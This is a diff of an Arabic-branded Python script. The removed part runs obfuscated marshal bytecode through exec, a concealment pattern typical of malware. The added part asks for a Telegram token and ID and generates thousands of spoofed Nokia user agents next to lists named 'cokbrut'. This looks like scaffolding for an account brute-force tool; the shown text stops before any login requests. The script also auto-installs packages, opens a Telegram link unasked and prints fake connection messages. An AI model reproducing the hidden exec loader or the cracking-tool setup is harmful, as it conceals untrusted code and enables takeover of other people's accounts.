@@ -1,80 +1,968 @@
-telegram = "نـمࢪود 𝑆 𝐷 𝑀"
-code = "EnCoding!"
-Any = (...,)
+a1 = '\x1b[1;31m'  # أحمر
+a2 = '\x1b[1;34m'  # أزرق
+a3 = '\x1b[1;32m'  # أخضر
+a4 = '\x1b[1;33m'  # أصفر
+a5 = '\x1b[38;5;208m'  # برتقالي
+a6 = '\x1b[38;5;5m'  # أرجواني
+a7 = '\x1b[38;5;13m'  # وردي
+a8 = '\x1b[1;30m'  # أسود
+a9 = '\x1b[1;37m'  # أبيض
+a10 = '\x1b[38;5;52m'  # بني
+a11 = '\x1b[38;5;8m'  # رمادي
+a12 = '\x1b[38;5;220m'  # ذهبي
+a13 = '\x1b[38;5;7m'  # فضي
+a14 = '\x1b[38;5;153m'  # أزرق فاتح
+a15 = '\x1b[38;5;18m'  # أزرق داكن
+a16 = '\x1b[38;5;48m'  # أخضر فاتح
+a17 = '\x1b[38;5;22m'  # أخضر داكن
+a18 = '\x1b[38;5;196m'  # أحمر فاتح
+a19 = '\x1b[38;5;88m'  # أحمر داكن
+a20 = '\x1b[38;5;226m'  # أصفر فاتح
+a21 = '\x1b[38;5;136m'  # أصفر داكن
+a22 = '\x1b[38;5;216m'  # برتقالي فات
+a23 = '\x1b[38;5;166m'  # برتقالي داكن
+a24 = '\x1b[38;5;234m'  # أرجواني فاتح
+a25 = '\x1b[38;5;91m'  # أرجواني داكن
+a26 = '\x1b[38;5;205m'  # وردي فاتح
+a27 = '\x1b[38;5;161m'  # وردي داكن
+a28 = '\x1b[38;5;236m'  # أسود فاتح
+a29 = '\x1b[38;5;233m'  # أسود داكن
+a30 = '\x1b[38;5;255m'  # أبيض فاتح
+a31 = '\x1b[38;5;231m'  # أبيض داكن
+a32 = '\x1b[38;5;180m'  # بني فاتح
+a33 = '\x1b[38;5;94m'  # بني داكن
+a34 = '\x1b[38;5;252m'  # رمادي فاتح
+a35 = '\x1b[38;5;246m'  # رمادي داكن
+a36 = '\x1b[38;5;228m'  # ذهبي فاتح
+a37 = '\x1b[38;5;172m'  # ذهبي داكن
+a38 = '\x1b[38;5;188m'  # فضي فاتح
+a39 = '\x1b[38;5;247m'  # فضي داكن
+a40 = '\x1b[38;5;117m'  # أزرق سماوي
+import requests
+print("""
+   \x1b[38;5;180m \x1b[38;5;180m 
+░██████╗██████╗░███╗░░░███╗
+██╔════╝██╔══██╗████╗░████║
+╚█████╗░██║░░██║██╔████╔██║
+░╚═══██╗██║░░██║██║╚██╔╝██║
+██████╔╝██████╔╝██║░╚═╝░██║
+╚═════╝░╚═════╝░╚═╝░░░░░╚═╝""") 
+print(a14+"━" *60)
+print(a36+'--'*30)
+print(a27+'المـبـࢪمج ☆𝑆𝐷𝑀☆ نـمࢪود | @Fjrrtt')
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from time import sleep
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import random
 
-class SDM:
-    def __init__(self, code: str) -> None:
-        self.code = code
-        self.execute(...)
-        return None
-    def execute(self, code: str = ...) -> None:
-        return exec(str(code))
-    
-class encode:
-    def calculate(num: int) -> int:
-        return num*2
-    def define(key, value: Any) -> Any:
-        globals()[key] = value
-        return globals()[key]
+import os
+import sys
+import time
+import os,sys,time,json,random,re,string,platform,base64
+#mport requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+import requests,bs4,json,os,sys,random,datetime,time,re
+import urllib3,rich,base64
+from rich.table import Table as me
+from rich.console import Console as sol
+from bs4 import BeautifulSoup as sop
+from bs4 import BeautifulSoup as parser
+from concurrent.futures import ThreadPoolExecutor as tred
+from rich.console import Group as gp
+from rich.panel import Panel as nel
+from rich import print as cetak
+from rich.markdown import Markdown as mark
+from rich.columns import Columns as col
+from rich import print as rprint
+from rich import pretty
+from rich.text import Text as tekz
+import os
+import webbrowser
+webbrowser.open('https://t.me/py_1hon')
+import webbrowser
 
-__5559__ = encode.calculate(457)                                                  ,encode.define('__5559__', b'c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00@\x00\x00\x00sf\x00\x00\x00d\x00d\x01l\x00T\x00d\x02d\x03d\x04d\x05d\x06d\x07')
-__7940__ = encode.calculate(480)                                                  ,encode.define('__7940__', b'd\x08d\td\nd\x0bd\x0ce\x01f\x0c\\\x0cZ\x02Z\x03Z\x04Z\x05Z\x06Z\x07Z\x08Z\tZ\nZ\x0bZ\x0cZ\rd\rd\x0e\x84\x00Z\x0ed\x0f')
-__7670__ = encode.calculate(858)                                                  ,encode.define('__7670__', b'd\x0e\x84\x00e\x0be\x05e\x08e\x07e\ne\x04e\te\x06e\x0cg\t\x83\x01\x01\x00d\x10S\x00)\x11\xe9\x00\x00\x00\x00)\x01\xda\x01*\xf3\x04\x00\x00\x002')
-__7836__ = encode.calculate(673)                                                  ,encode.define('__7836__', b'932s\x13\x00\x00\x003033\x003052\x003033\x003031s\xdb\x00\x00\x003044\x003043\x003046\x00304')
-__7465__ = encode.calculate(18)                                                  ,encode.define('__7465__', b'8\x002964\x003051\x003033\x003030\x003030\x003046\x003043\x003051\x003047\x00303')
-__8158__ = encode.calculate(472)                                                  ,encode.define('__8158__', b'3\x003046\x002942\x003015\x003000\x003009\x002964\x002993\x002964\x002966\x00303')
-__5146__ = encode.calculate(598)                                                  ,encode.define('__5146__', b'6\x003048\x003048\x003044\x003047\x002990\x002979\x002979\x003046\x003029\x00305')
-__9295__ = encode.calculate(671)                                                  ,encode.define('__9295__', b'1\x002978\x003035\x003037\x003048\x003036\x003049\x003030\x003049\x003047\x00303')
-__8844__ = encode.calculate(63)                                                  ,encode.define('__8844__', b'3s\xe1\x00\x00\x002942\x002964\x002964\x002964\x002964\x002964\x002964\x002964\x002964')
-__7120__ = encode.calculate(120)                                                  ,encode.define('__7120__', b'\x003048\x003033\x003040\x003033\x003035\x003046\x003029\x003041\x002964\x002965')
-__1535__ = encode.calculate(109)                                                  ,encode.define('__1535__', b'\x002993\x002964\x002966\x004538\x004532\x004537\x005150\x004540\x004515\x002964')
-__4979__ = encode.calculate(672)                                                  ,encode.define('__4979__', b'\x00122810\x002964\x00122795\x002964\x00122804\x002966\x002964\x003043\x00304')
-__3948__ = encode.calculate(275)                                                  ,encode.define('__3948__', b'6\x002942\x002964\x002964\x002964\x002964\x002964s\xdb\x00\x00\x003046\x003033\x003047')
-__4189__ = encode.calculate(568)                                                  ,encode.define('__4189__', b'\x003044\x003043\x003042\x003047\x003033\x002964\x002993\x002964\x003046\x003033')
-__5679__ = encode.calculate(624)                                                  ,encode.define('__5679__', b'\x003045\x003049\x003033\x003047\x003048\x003047\x002978\x003035\x003033\x003048')
-__7182__ = encode.calculate(55)                                                  ,encode.define('__7182__', b'\x002972\x003015\x003000\x003009\x002973\x002942\x003018\x003005\x003012\x003015')
-__4218__ = encode.calculate(592)                                                  ,encode.define('__4218__', b'\x003000\x003009\x002964\x002993\x002964\x003046\x003033\x003047\x003044\x003043')
-__6901__ = encode.calculate(495)                                                  ,encode.define('__6901__', b'\x003042s\xdb\x00\x00\x002966\x002964\x003042\x003043\x003048\x002964\x003037\x003042\x00')
-__9314__ = encode.calculate(345)                                                  ,encode.define('__9314__', b'2964\x003035\x003040\x003043\x003030\x003029\x003040\x003047\x002972\x002973\x00')
-__2883__ = encode.calculate(221)                                                  ,encode.define('__2883__', b'2942\x002964\x002964\x002964\x002964\x002973\x002990\x002942\x002964\x002964\x00')
-__6733__ = encode.calculate(793)                                                  ,encode.define('__6733__', b'2964\x002964\x002964\x002964\x002964\x002964\x003037\x003042\x003048\x002972\x00')
-__4834__ = encode.calculate(451)                                                  ,encode.define('__4834__', b'2971\x003047\x003039\x003037\x003032\x002971s\xdb\x00\x00\x002964\x002964\x002964\x002')
-__8395__ = encode.calculate(633)                                                  ,encode.define('__8395__', b'966\x003015\x003000\x003009\x002966\x002964\x003042\x003043\x003048\x002964\x003')
-__7108__ = encode.calculate(61)                                                  ,encode.define('__7108__', b'037\x003042\x002964\x003035\x003040\x003043\x003030\x003029\x003040\x003047\x002')
-__4576__ = encode.calculate(400)                                                  ,encode.define('__4576__', b'972\x002973\x002964\x003043\x003046\x002942\x002964\x002964\x002964\x002964\x002')
-__9670__ = encode.calculate(136)                                                  ,encode.define('__9670__', b'964\x002964\x002964\x002964\x002966\x003033\x003042\x003031\x003043\x003032\x003')
-__1189__ = encode.calculate(71)                                                  ,encode.define('__1189__', b'033s\xdb\x00\x00\x003046\x003031\x003043\x003042\x003048\x003033\x003042\x003048\x0029')
-__6410__ = encode.calculate(449)                                                  ,encode.define('__6410__', b'78\x003031\x003043\x003041\x002979\x003021\x003043\x003049\x003047\x003047\x0030')
-__3169__ = encode.calculate(308)                                                  ,encode.define('__3169__', b'46\x003037\x003029\x003040\x003035\x002979\x003004\x003036\x002979\x003041\x0030')
-__8721__ = encode.calculate(897)                                                  ,encode.define('__8721__', b'29\x003037\x003042\x002979\x003030\x003043\x003031\x003043\x003040\x003049\x0030')
-__8159__ = encode.calculate(236)                                                  ,encode.define('__8159__', b'41\x002978\x003044\x003053\x002966\x002942s\xdb\x00\x00\x002973\x002942\x003033\x00305')
-__6527__ = encode.calculate(184)                                                  ,encode.define('__6527__', b'2\x003031\x003033\x003044\x003048\x002990\x002942\x002964\x002964\x002964\x00296')
-__4445__ = encode.calculate(528)                                                  ,encode.define('__4445__', b'4\x003033\x003052\x003037\x003048\x002972\x002971\x002995\x002971\x002973\x00294')
-__9534__ = encode.calculate(287)                                                  ,encode.define('__9534__', b'2\x002942\x002942\x003037\x003041\x003044\x003043\x003046\x003048\x002964\x00304')
-__4702__ = encode.calculate(20)                                                  ,encode.define('__4702__', b'6\x003033\x003045\x003049\x003033\x003047\x003048\x003047\x002942\x003037\x00304')
-__1605__ = encode.calculate(15)                                                  ,encode.define('__1605__', b'1s\xdb\x00\x00\x003048\x003046\x003053\x002990\x002942\x002964\x002964\x002964\x002964')
-__4414__ = encode.calculate(107)                                                  ,encode.define('__4414__', b'\x003037\x003034\x002964\x002972\x002942\x002964\x002964\x002964\x002964\x002964')
-__6987__ = encode.calculate(684)                                                  ,encode.define('__6987__', b'\x002964\x002964\x002964\x003031\x003043\x003032\x003033\x002964\x002965\x002993')
-__3010__ = encode.calculate(829)                                                  ,encode.define('__3010__', b'\x002964\x002966\x003001\x003042\x002999\x003043\x003032\x003037\x003042\x003035')
-__5294__ = encode.calculate(341)                                                  ,encode.define('__5294__', b'\x002965\x002966\x002964\x003043\x003046sc\x00\x00\x003047\x003033\x002978\x003048\x00')
-__7993__ = encode.calculate(381)                                                  ,encode.define('__7993__', b'3033\x003052\x003048\x002942\x003033\x003052\x003033\x003031\x002972\x003018\x00')
-__2866__ = encode.calculate(292)                                                  ,encode.define('__2866__', b'3005\x003012\x003015\x003000\x003009\x002973c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x06\x00\x00\x00')
-__3890__ = encode.calculate(587)                                                  ,encode.define('__3890__', b'C\x00\x00\x00s\x1e\x00\x00\x00d\x01\xa0\x00d\x02d\x03\x84\x00|\x00\xa0\x01\xa1\x00\xa0\x02d\x04\xa1\x01D\x00\x83\x01\xa1\x01S\x00)\x05N\xda\x00c\x01\x00\x00\x00\x00')
-__4522__ = encode.calculate(272)                                                  ,encode.define('__4522__', b'\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00s\x00\x00\x00s"\x00\x00\x00|\x00]\x1a}\x01t\x00t\x01|\x01\x83\x01t\x01d\x00\x83\x01\x18\x00\x83\x01V\x00')
-__8826__ = encode.calculate(452)                                                  ,encode.define('__8826__', b'\x01\x00q\x02d\x01S\x00)\x02r\x02\x00\x00\x00N)\x02\xda\x03chr\xda\x03int)\x02\xda\x02.0\xda\x08__3042__\xa9\x00r\x08\x00\x00')
-__5568__ = encode.calculate(132)                                                  ,encode.define('__5568__', b'\x00\xda\x03SDM\xda\t<genexpr>\x03\x00\x00\x00\xf3\x00\x00\x00\x00\xfa\x1b<lambda>.<locals>.<gen')
-__8560__ = encode.calculate(107)                                                  ,encode.define('__8560__', b'expr>\xfa\x01\x00)\x03\xda\x04join\xda\x06decode\xda\x05split\xa9\x01\xda\x08__2911__r\x08\x00\x00\x00r\x08')
-__2916__ = encode.calculate(441)                                                  ,encode.define('__2916__', b'\x00\x00\x00r\t\x00\x00\x00\xda\x08<lambda>\x03\x00\x00\x00r\x0b\x00\x00\x00r\x13\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x05')
-__3411__ = encode.calculate(165)                                                  ,encode.define('__3411__', b'\x00\x00\x00C\x00\x00\x00s(\x00\x00\x00t\x00\x83\x00t\x01t\x02d\x01\x8d\x01\x19\x00d\x02\xa0\x03d\x03d\x04\x84\x00|\x00D\x00\x83\x01\xa1\x01t\x00\x83\x00\x83\x02')
-__6103__ = encode.calculate(713)                                                  ,encode.define('__6103__', b'S\x00)\x05Nr\x11\x00\x00\x00r\x03\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x04\x00\x00\x00s\x00\x00\x00s\x18\x00\x00\x00|\x00]\x10}')
-__4287__ = encode.calculate(389)                                                  ,encode.define('__4287__', b'\x01t\x00|\x01d\x00\x8d\x01V\x00\x01\x00q\x02d\x01S\x00)\x02r\x11\x00\x00\x00N)\x01\xda\x08__8019__)\x02r\x06\x00\x00\x00r\x12\x00\x00')
-__9232__ = encode.calculate(481)                                                  ,encode.define('__9232__', b'\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\n\x00\x00\x00\x04\x00\x00\x00r\x0b\x00\x00\x00r\x0c\x00\x00\x00)\x04\xda\x08__8350__r\x14\x00')
-__3910__ = encode.calculate(61)                                                  ,encode.define('__3910__', b'\x00\x00\xda\x08__6370__r\x0e\x00\x00\x00)\x01r\x07\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00r\t\x00\x00\x00r\x13\x00\x00\x00\x04\x00\x00\x00r\x0b')
-__7284__ = encode.calculate(635)                                                  ,encode.define('__7284__', b'\x00\x00\x00N)\x0f\xda\x08builtins\xda\x07globalsZ\x08__8944__r\x16\x00\x00\x00Z\x08__6511__')
-__4846__ = encode.calculate(183)                                                  ,encode.define('__4846__', b'Z\x08__9300__Z\x08__2558__Z\x08__7420__Z\x08__6569__Z\x08__8734__')
-__7459__ = encode.calculate(186)                                                  ,encode.define('__7459__', b'Z\x08__2017__Z\x08__9672__Z\x08__5659__r\x15\x00\x00\x00r\x14\x00\x00\x00r\x08\x00\x00\x00r\x08\x00\x00\x00')
-__2230__ = encode.calculate(215)                                                  ,encode.define('__2230__', b'r\x08\x00\x00\x00r\t\x00\x00\x00\xda\x08<module>\x01\x00\x00\x00s\x06\x00\x00\x00\x08\x014\x01\x08\x01')
+import requests,time,pyfiglet,datetime
+now = datetime.datetime.today()
+
+now = datetime.datetime.today()
+mm = str(now.month)
+dd = str(now.day)
+yyyy = str(now.year)
+hour = str(now.hour)
+mi = str(now.minute)
+ss = str(now.second)
+t=(mm + "/" + dd + "/" + yyyy + " " + hour + ":" + mi + ":" + ss)
 
 
-if __name__ == '__main__':
-    SDM(code)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ,exec(__import__('marshal').loads(__5559__[1]+__7940__[1]+__7670__[1]+__7836__[1]+__7465__[1]+__8158__[1]+__5146__[1]+__9295__[1]+__8844__[1]+__7120__[1]+__1535__[1]+__4979__[1]+__3948__[1]+__4189__[1]+__5679__[1]+__7182__[1]+__4218__[1]+__6901__[1]+__9314__[1]+__2883__[1]+__6733__[1]+__4834__[1]+__8395__[1]+__7108__[1]+__4576__[1]+__9670__[1]+__1189__[1]+__6410__[1]+__3169__[1]+__8721__[1]+__8159__[1]+__6527__[1]+__4445__[1]+__9534__[1]+__4702__[1]+__1605__[1]+__4414__[1]+__6987__[1]+__3010__[1]+__5294__[1]+__7993__[1]+__2866__[1]+__3890__[1]+__4522__[1]+__8826__[1]+__5568__[1]+__8560__[1]+__2916__[1]+__3411__[1]+__6103__[1]+__4287__[1]+__9232__[1]+__3910__[1]+__7284__[1]+__4846__[1]+__7459__[1]+__2230__[1]),globals())
+hours = (now.hour)
+x = datetime.datetime.now()
+g= datetime.datetime(2023, 1, 26, 12, 10 ,9)
+
+
+if (x.strftime("%x"))>(g.strftime("%x")):
+ print('\033[1;33m يتم الاتصال ADMIN ' "")
+ print('')
+ time.sleep(1)
+ print('\033[1;46m يتم الاتصال بسيرفر') 
+ print('') 
+ time.sleep(1)
+ print('\033[1;16m تم الاتصال.. ')
+ print('') 
+ time.sleep(1)
+ print('\033[1;61m نورت انت مستخدم free ')
+ print('') 
+ time.sleep(1)
+ print('\033[1;72m تم الاتصال IP YOU:192.168.0.25')
+ webbrowser.open('https://t.me/py_1hon')
+
+import time
+import sys
+import os
+
+now = datetime.datetime.today()
+
+
+try:
+        
+        import rich
+except ImportError:
+        cetak(nel('\t• المبـــرمــج سلفــادوࢪ VIP •'))
+        os.system('pip3.9 install rich')
+try:
+        import stdiomask
+except ImportError:
+        cetak(nel('\t المبـــرمــج سلفــادوࢪ VIP'))
+        os.system('pip3.9 install stdiomask')
+try:
+
+	import requests
+except ImportError:
+	Z = '\033[1;31m' #احمر
+R = '\033[1;31m' #احمر
+X = '\033[1;33m' #اصفر
+F = '\033[2;32m' #اخضر
+C = "\033[1;97m" #ابيض
+B = '\033[2;36m'#سمائي
+Y = '\033[1;34m' #ازرق فاتح.
+E = '\033[1;31m'
+B = '\033[2;36m'
+G = '\033[1;32m'
+S = '\033[1;33m'
+
+print(' ') 
+print(f""" \033[0;99m
+\033[0;99m
+⣶⣶⡶⠶⠶⠶⠶⠶⠶⠶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀
+⢸⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⣿⠇⠀⠀⢀⣿⣿⣿⣷⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+⢸⣿⣿⡟⠀⠀⠀⠸⠿⠿⠿⠏⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
+
+
+⠀⠀⠀⢀⡤⢤⢄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⣼⡅⠠⢀⡈⢀⣙⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠤⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⢸⠀⠀⠀⠈⠙⠿⣝⢇⠀⠀⣀⣠⠤⠤⠤⠤⣤⡤⠚⠁⠀⠀⠀⠀⠀⠉⠢⡀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢧⡀⠀⠀⠠⣄⠈⢺⣺⡍⠀⠀⠀⠀⣠⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠸⡆⢀⠘⣔⠄⠑⠂⠈⠀⡔⠤⠴⠚⡁⠀⠀⢀⠀⠀⠀⣠⠔⢶⡢⡀⠀⠠⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⢠⣇⠀⢃⡀⠁⠀⠀⠀⡸⠃⢀⡴⠊⢀⠀⠀⠈⢂⡤⠚⠁⠀⠀⠙⢿⠀⠉⡇⠀⠀⠀⠀⠀
+⠀⠀⠀⣠⠾⣹⢤⢼⡆⠀⠀⠀⠀⠀⠀⠈⢀⠞⠁⠀⢠⣴⠏⠀⠀⠀⠀⠀⠀⠸⡇⠀⢇⠀⠀⠀⠀⠀
+⠀⠀⣾⢡⣤⡈⠣⡀⠙⠒⠀⠀⠀⠀⣀⠤⠤⣤⠤⣌⠁⢛⡄⠀⠀⠀⠀⠀⠠⡀⢇⠀⠘⣆⠀⢀⡴⡆
+⠀⠀⣿⢻⣿⣿⣄⡸⠀⡆⠀⠒⣈⣩⣉⣉⡈⠉⠉⠢⣉⠉⠀⠀⠀⠀⠀⠀⠀⢣⠈⠢⣀⠈⠉⢁⡴⠃             ⠀⢀⢿⣿⣿⡿⠛⠁⠀⢻⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⣸⢿⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⡇⠉⠉⠁⠀⠀
+⣠⣞⠘⢛⡛⢻⣷⣤⡀⠈⡎⣿⣿⣿⣿⣿⣿⣿⣿⣿⠹⠏⠀⠀⠀⠀⠀⠀⠀⠀⠇⢰⡇⠀⠀⠀⠀⠀
+⠻⣌⠯⡁⢠⣸⣿⣿⣷⡄⠁⠈⢻⢿⣿⣿⣿⣿⠿⠋⠃⠰⣀⠀⠀⠀⠀⠀⠀⠀⠀⣾⠇⠀⠀⠀⠀⠀
+⠀⠀⠉⢻⠨⠟⠹⢿⣿⢣⠀⠀⢨⡧⣌⠉⠁⣀⠴⠊⠑⠀⡸⠛⠀⠀⠀⠀⠀⣸⢲⡟⠀⠀⠀⠀⠀⠀             ⠀⠀⣠⠏⠀⠀⠀⠉⠉⠁⠀⠐⠁⠀⠀⢉⣉⠁⠀⠀⢀⠔⢷⣄⠀⠀⠀⠀⢠⣻⡞⠀⠀⠀⠀⠀⠀⠀
+⠀⢠⠟⡦⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢾⠉⠀⣹⣦⠤⣿⣿⡟⠁⠀⠀⠀⢀⣶⠟⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠈⠙⣦⣁⡎⢈⠏⢱⠚⢲⠔⢲⠲⡖⠖⣦⣿⡟⠀⣿⡿⠁⣠⢔⡤⠷⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢿⣟⠿⡿⠿⠶⢾⠶⠾⠶⠾⠞⢻⠋⠏⣸⠁⠀⡽⠓⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⢸⡏⠳⠷⠴⠣⠜⠢⠜⠓⠛⠊⠀⢀⡴⠣⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⠀⠀⣏⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠊⠁⢀⣀⣀⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⠀⠀⠘⢦⡀⠀⠀⠀⠀⠀⠀⢀⣀⠴⠖⠒⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀             ⠀⠀⠀⠀⠉⠑⠒⠒⠐⠒⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀
+   ┏━━━━━━━━━━━━━━━━━━━━━━━━━━┓    
+ ┃ ⌯الـمبـرمج سيد VIP {B}› {C} {B} ┃@M_T_F
+   ┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
+
+""")
+sleep(3)
+print(a14+"▱" *60)
+token=input(B+'توڪن TOKEN  : '+F)
+print(a14+"•" *60)
+ID=input(B+'ايـدي ID  :  : '+F)
+print(a14+"▱" *60)
+
+
+os.system('clear')
+
+cetak(nel('\t• المبرمج نـمـرود 𝑆 𝐷 𝑀•'))
+
+pretty.install()
+CON=sol()
+ugen2=['NokiaC2-01/5.0 (11.40) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; ar; nokiac2-01) U2/1.0.0 UCBrowser/8.9.0.251 U2/1.0.0 Mobile UNTRUSTED/1.0']
+ugen=['NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Opera/9.80 (Android; Opera Mini/7.5.33361/191.273; U; pt) Presto/2.12.423 Version/12.16 UNTRUSTED/1.0']
+cokbrut=[]
+ses=requests.Session()
+princp=[]
+
+for xd in range(10000):
+	a='Nokia5350/10.1.011 (SymbianOS/10;'
+	b=random.randrange(1, 9)
+	c=random.randrange(1, 9)
+	d='Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)'
+	e=random.randrange(100, 9999)
+	f='AppleWebKit/525 (KHTML, like Gecko)'
+	g=random.randrange(1, 9)
+	h=random.randrange(1, 4)
+	i=random.randrange(1, 4)
+	j=random.randrange(1, 4)
+	k='Safari/525 3gpp-gba'
+	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+	ugen2.append(uaku)    
+	
+	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/413 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Safari/413 UNTRUSTED/1.0'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['SAMSUNG SM-X906B)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko)'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+	aa='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;'
+	b=random.choice(['7.0','8.1.0','9','10','11','12'])
+	c=random.choice(['nokiac1-01)'])
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='U2/1.0.0 UCBrowser/8.9.0.251'
+	h=random.randrange(80,103)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='U2/1.0.0 Mobile UNTRUSTED/1.06'
+	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
+	ugen.append(uaku2)
+	
+
+
+
